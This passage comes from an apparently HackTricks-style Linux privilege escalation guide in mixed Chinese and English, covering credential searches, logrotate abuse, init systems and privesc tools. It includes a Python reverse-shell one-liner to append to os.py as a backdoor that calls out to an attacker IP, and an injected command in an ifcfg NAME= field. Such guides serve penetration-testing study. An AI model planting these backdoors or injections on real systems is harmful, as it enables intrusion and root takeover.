~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

你还应该检查文件名或内容中包含单词 "**password**" 的文件，并且在 logs 中检查 IPs 和 emails，或者通过 hashes regexps 查找。\
我不会在这里列出如何执行所有这些操作，但如果你感兴趣，可以查看 [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) 执行的最后几项检查。

## Writable files

### Python library hijacking

If you know from **where** a python script is going to be executed and you **can write inside** that folder or you can **modify python libraries**, you can modify the OS library and backdoor it (if you can write where python script is going to be executed, copy and paste the os.py library).

To **backdoor the library** just add at the end of the os.py library the following line (change IP and PORT):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotate 漏洞利用

A vulnerability in `logrotate` lets users with **write permissions** on a log file or its parent directories potentially gain escalated privileges. This is because `logrotate`, often running as **root**, can be manipulated to execute arbitrary files, especially in directories like _**/etc/bash_completion.d/**_. It's important to check permissions not just in _/var/log_ but also in any directory where log rotation is applied.

> [!TIP]
> This vulnerability affects `logrotate` version `3.18.0` and older

More detailed information about the vulnerability can be found on this page: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

You can exploit this vulnerability with [**logrotten**](https://github.com/whotwagner/logrotten).

This vulnerability is very similar to [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** so whenever you find that you can alter logs, check who is managing those logs and check if you can escalate privileges substituting the logs by symlinks.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Vulnerability reference:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

If, for whatever reason, a user is able to **write** an `ifcf-<whatever>` script to _/etc/sysconfig/network-scripts_ **or** it can **adjust** an existing one, then your **system is pwned**.

Network scripts, _ifcg-eth0_ for example are used for network connections. They look exactly like .INI files. However, they are \~sourced\~ on Linux by Network Manager (dispatcher.d).

In my case, the `NAME=` attributed in these network scripts is not handled correctly. If you have **white/blank space in the name the system tries to execute the part after the white/blank space**. This means that **everything after the first blank space is executed as root**.

For example: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
（注意 Network 和 /bin/id_ 之间的空格）

### **init, init.d, systemd, 和 rc.d**

目录 `/etc/init.d` 存放用于 System V init (SysVinit) 的 **脚本**，这是经典的 Linux 服务管理系统。它包含用来 `start`、`stop`、`restart`，有时还有 `reload` 服务的脚本。这些脚本可以直接执行，或通过位于 `/etc/rc?.d/` 的符号链接来执行。在 Redhat 系统中，替代路径为 `/etc/rc.d/init.d`。

另一方面，`/etc/init` 与 **Upstart** 相关，Upstart 是 Ubuntu 引入的较新的 **service management**，使用配置文件来管理服务任务。尽管已向 Upstart 过渡，SysVinit 脚本仍会与 Upstart 配置一并使用，因为 Upstart 提供了兼容层。

**systemd** 作为现代的初始化和服务管理器出现，提供按需守护进程启动、自动挂载管理和系统状态快照等高级功能。它将文件组织在 `/usr/lib/systemd/`（用于发行版包）和 `/etc/systemd/system/`（供管理员修改），以简化系统管理流程。

## Other Tricks

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks 常常 hook 一个 syscall，将特权的内核功能暴露给用户空间的 manager。弱的 manager 认证（例如基于 FD-order 的签名检查或糟糕的密码方案）可能允许本地应用冒充 manager，从而在已被 root 的设备上升级为 root。更多细节与利用说明见：


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## VMware Tools service discovery LPE (CWE-426) via regex-based exec (CVE-2025-41244)

基于正则的服务发现（在 VMware Tools/Aria Operations 中）可以从进程命令行提取二进制路径并在特权上下文中以 -v 参数执行。宽松的模式（例如使用 \S）可能匹配到攻击者放置在可写位置（例如 /tmp/httpd）的监听器，导致以 root 身份执行（CWE-426 Untrusted Search Path）。

了解更多并查看适用于其他发现/监控栈的通用模式： 

{{#ref}}
vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Kernel Security Protections

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Best tool to look for Linux local privilege escalation vectors:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** 枚举 Linux 和 MAC 中的内核漏洞 [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## References

- [0xdf – HTB Planning (Crontab UI privesc, zip -P creds reuse)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [0xdf – HTB Era: forged .text_sig payload for cron-executed monitor](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [0xdf – Holiday Hack Challenge 2025: Neighborhood Watch Bypass (sudo env_keep PATH hijack)](https://0xdf.gitlab.io/holidayhack2025/act1/neighborhood-watch)
- [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [NVISO – You name it, VMware elevates it (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)

{{#include ../../banners/hacktricks-training.md}}
